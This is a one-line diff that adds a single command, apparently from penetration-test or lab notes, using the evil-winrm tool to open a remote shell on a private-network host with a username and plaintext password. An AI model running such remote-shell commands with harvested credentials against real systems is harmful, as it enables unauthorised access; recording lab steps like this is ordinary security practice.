@@ -1,0 +1,1 @@
+evil-winrm -i 192.168.180.165 -u 'enox' -p 'california'
